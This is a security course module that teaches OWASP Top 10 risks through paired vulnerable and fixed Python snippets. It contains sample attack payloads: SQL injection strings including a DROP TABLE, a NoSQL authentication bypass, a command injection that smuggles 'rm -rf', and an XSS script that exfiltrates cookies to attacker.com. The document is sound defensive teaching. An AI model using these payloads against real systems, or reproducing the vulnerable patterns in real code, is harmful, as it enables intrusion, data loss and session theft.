# Module 7: Backend Security Engineering

Security is not a feature you add at the end. Every component you build is an attack surface. This module covers the OWASP Top 10 — the ten most critical web application security risks — with working exploit demos and fixes.

---

## 1. Injection Attacks

Injection attacks occur when user-supplied data is interpreted as code. They are the #1 most dangerous vulnerability class.

### SQL Injection

```python
# ❌ CRITICALLY VULNERABLE — NEVER do this
def get_user_by_username(username: str):
    query = f"SELECT * FROM users WHERE username = '{username}'"
    return db.execute(query)

# Attack: username = "' OR '1'='1"
# Resulting query: SELECT * FROM users WHERE username = '' OR '1'='1'
# Returns ALL users!

# More dangerous: username = "'; DROP TABLE users;--"
```

**Fix: Parameterized Queries (Always)**
```python
# ✅ SAFE — Database driver handles escaping
def get_user_by_username(username: str):
    return db.execute("SELECT * FROM users WHERE username = %s", (username,))
    # The driver ensures 'username' is ALWAYS treated as data, never as SQL code
```

### NoSQL Injection (MongoDB)
```python
# ❌ Vulnerable — user controls the query operator
user_input = {"$ne": ""}   # User sends this as the "password"
db.users.find({"username": "admin", "password": user_input})
# { "password": {"$ne": ""} } matches any user whose password is not empty string
# Bypasses authentication completely!

# ✅ Fix: Validate input is a string, never pass raw dicts from user input
if not isinstance(password_input, str):
    raise HTTPException(status_code=400, detail="Invalid input type")
```

### Command Injection
```python
# ❌ Vulnerable
import subprocess
def ping_host(host: str):
    result = subprocess.run(f"ping -c 3 {host}", shell=True, capture_output=True)
    return result.stdout

# Attack: host = "google.com; rm -rf /important/data"
# Executes: ping -c 3 google.com; rm -rf /important/data

# ✅ Fix: Never use shell=True. Pass arguments as a list.
def ping_host(host: str):
    # Validate host is a valid hostname first
    import re
    if not re.match(r'^[a-zA-Z0-9.-]+$', host):
        raise ValueError("Invalid hostname")
    result = subprocess.run(["ping", "-c", "3", host], capture_output=True, timeout=10)
    return result.stdout
```

---

## 2. Broken Authentication

### JWT Algorithm Confusion Attack

```python
# Your server uses RS256 (asymmetric): private key signs, public key verifies
# The public key is... public. Everyone can see it.

# Attack: Attacker creates a JWT with:
# header: {"alg": "HS256"}  (switched to symmetric!)
# payload: {"sub": "admin", "role": "admin"}
# signature: HMAC-SHA256(header + payload, public_key)
# Since HS256 uses the same key for signing AND verifying,
# and the server uses the PUBLIC KEY to verify HS256...
# this forged token passes verification!

# ✅ Fix: Always explicitly specify allowed algorithms
decoded = jwt.decode(
    token,
    public_key,
    algorithms=["RS256"],   # Reject HS256 tokens entirely!
)
```

### Weak Secret Keys
```python
# ❌ Weak secrets are brute-forceable
SECRET_KEY = "secret"  # Attackers can crack this in milliseconds

# ✅ Use cryptographically random 32+ byte secrets
import secrets
SECRET_KEY = secrets.token_hex(32)  # Generate fresh, store in environment variables
```

---

## 3. Sensitive Data Exposure

### Secrets in Code (Most Common Leak)
```python
# ❌ NEVER in code — this will be in your git history forever!
DATABASE_URL = "postgresql://admin:SuperSecret123@prod-db.company.com/production"
STRIPE_KEY = "sk_live_abc123xyz789"

# ✅ Use environment variables
import os
DATABASE_URL = os.environ["DATABASE_URL"]
STRIPE_KEY = os.environ["STRIPE_SECRET_KEY"]
```

### Storing Secrets Securely
- Development: `.env` file (git-ignored) + `python-dotenv`
- Production: AWS Secrets Manager, HashiCorp Vault, or cloud-native secret management
- Never: environment variables baked into Docker images, config files committed to git

### Information Leakage in Error Responses
```python
# ❌ Never expose internal details
@app.exception_handler(Exception)
async def generic_exception_handler(request, exc):
    return JSONResponse(
        status_code=500,
        content={"error": str(exc), "traceback": traceback.format_exc()}
        # Exposes: database schemas, file paths, library versions, stack traces
    )

# ✅ Log internally, return generic message externally
@app.exception_handler(Exception)
async def generic_exception_handler(request, exc):
    error_id = str(uuid.uuid4())
    logger.exception(f"Unhandled error {error_id}", exc_info=exc)
    return JSONResponse(
        status_code=500,
        content={"error": "An internal error occurred", "error_id": error_id}
        # User sees error_id for support, developer checks logs with error_id
    )
```

---

## 4. Cross-Site Scripting (XSS)

XSS allows attackers to inject malicious JavaScript into your web pages, which then executes in other users' browsers.

### Stored XSS
```python
# User submits a comment with this content:
malicious_comment = '<script>document.location="https://attacker.com/steal?cookie="+document.cookie</script>'

# If you store this in DB and render it in HTML without escaping:
html = f"<div class='comment'>{user_comment}</div>"
# Every user who views this page gets their cookie stolen!
```

**Fix**: Always HTML-escape user content. Modern frameworks (React, Vue) do this automatically. For Python string templates, use `html.escape()` or a template engine with auto-escaping.

### Content Security Policy (CSP)
```python
from fastapi import Response

@app.middleware("http")
async def add_security_headers(request, call_next):
    response = await call_next(request)
    response.headers["Content-Security-Policy"] = (
        "default-src 'self'; "           # Only load resources from your own domain
        "script-src 'self'; "            # No inline scripts
        "object-src 'none'; "            # No Flash
        "frame-ancestors 'none';"        # No iframes (prevents clickjacking)
    )
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "DENY"
    response.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"
    return response
```

---

## 5. Insecure Direct Object References (IDOR)

```python
# ❌ Vulnerable: user can access ANY user's data by changing the ID
@app.get("/users/{user_id}/profile")
def get_profile(user_id: int, current_user = Depends(get_current_user)):
    return db.get_user(user_id)   # No authorization check!

# Attack: user with ID 42 requests /users/1/profile → sees admin's profile

# ✅ Fix: Always verify the requesting user has permission
@app.get("/users/{user_id}/profile")
def get_profile(user_id: int, current_user = Depends(get_current_user)):
    if current_user["id"] != user_id and current_user["role"] != "admin":
        raise HTTPException(status_code=403, detail="Access denied")
    return db.get_user(user_id)
```

---

## 6. Security Misconfiguration

### CORS — Most Common Misconfiguration
```python
from fastapi.middleware.cors import CORSMiddleware

# ❌ Allows any website to make requests to your API (CSRF vulnerability!)
app.add_middleware(CORSMiddleware, allow_origins=["*"])

# ✅ Only allow your own frontend origins
app.add_middleware(
    CORSMiddleware,
    allow_origins=["https://app.yourcompany.com", "https://admin.yourcompany.com"],
    allow_methods=["GET", "POST", "PUT", "DELETE"],
    allow_headers=["Authorization", "Content-Type"],
    allow_credentials=True,
)
```

---

## 7. Dependency Scanning

A large fraction of real-world security vulnerabilities come from outdated dependencies with known CVEs.

```bash
# Scan Python dependencies for known vulnerabilities
pip install safety
safety check

# Lint Python code for security issues
pip install bandit
bandit -r your_app/

# GitHub Dependabot: automatically opens PRs when dependencies have CVEs
# Enable in: Repository Settings → Security → Dependabot alerts
```

---

## Next Steps

Go to `labs/` for a deliberately vulnerable FastAPI app that you will attack and then fix, one vulnerability at a time!
